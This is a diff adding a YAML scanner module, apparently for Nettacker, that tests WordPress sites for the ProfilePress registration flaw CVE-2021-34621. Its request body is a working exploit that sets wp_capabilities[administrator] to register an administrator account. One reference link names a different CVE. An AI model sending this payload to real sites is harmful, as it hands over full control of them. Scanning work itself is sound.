@@ -1,0 +1,97 @@
+info:
+  name: wp_plugin_cve_2021_34621_vuln
+  author: Manushya
+  severity: 9.8
+  description: A significant vulnerability discovered in the user registration component of the ProfilePress WordPress plugin. This security issue, identified as CVE-2021-34621, enables unauthorized users to register on websites with administrator privileges, which could result in a full compromise of the site's security.
+  references: 
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-2011
+    - https://blog.securelayer7.net/easily-exploitable-critical-vulnerability-in-profilepress-plugin-of-wordpress-cve-2021-34621/
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - high_severity
+    - wordpress
+    - wp
+    - profile_press
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          content-Type: multipart/form-data; boundary=----WebKitFormBoundary5XkgsgiDB4ZqFfxk
+          Accept: application/json, text/javascript, */*; q=0.01
+          Accept-Encoding: gzip, deflate, br
+          Connection: keep-alive
+          X-Requested-With: XMLHttpRequest
+
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/wp-admin/admin-ajax.php/"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        data: |
+          ------WebKitFormBoundary5XkgsgiDB4ZqFfxk
+          Content-Disposition: form-data; name="reg_username"
+
+          xyzrandom
+          ------WebKitFormBoundary5XkgsgiDB4ZqFfxk
+          Content-Disposition: form-data; name="reg_email"
+
+          xyzrandom@gmail.com
+          ------WebKitFormBoundary5XkgsgiDB4ZqFfxk
+          Content-Disposition: form-data; name="reg_password"
+
+          randomxyz
+          ------WebKitFormBoundary5XkgsgiDB4ZqFfxk
+          Content-Disposition: form-data; name="reg_password_present"
+
+          true
+          ------WebKitFormBoundary5XkgsgiDB4ZqFfxk
+          Content-Disposition: form-data; name="reg_first_name"
+
+          xyz
+          ------WebKitFormBoundary5XkgsgiDB4ZqFfxk
+          Content-Disposition: form-data; name="reg_last_name"
+
+          abc
+          ------WebKitFormBoundary5XkgsgiDB4ZqFfxk
+          Content-Disposition: form-data; name="wp_capabilities[administrator]"
+
+          1
+          ------WebKitFormBoundary5XkgsgiDB4ZqFfxk
+          Content-Disposition: form-data; name="signup_form_id"
+
+          1
+          ------WebKitFormBoundary5XkgsgiDB4ZqFfxk
+          Content-Disposition: form-data; name="action"
+
+          pp_ajax_signup
+          ------WebKitFormBoundary5XkgsgiDB4ZqFfxk
+          Content-Disposition: form-data; name="melange_id"
+
+
+          ------WebKitFormBoundary5XkgsgiDB4ZqFfxk--
+
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "500"
+              reverse: false
+            content:
+              regex: "There has been a critical error on this website."
+              reverse: false
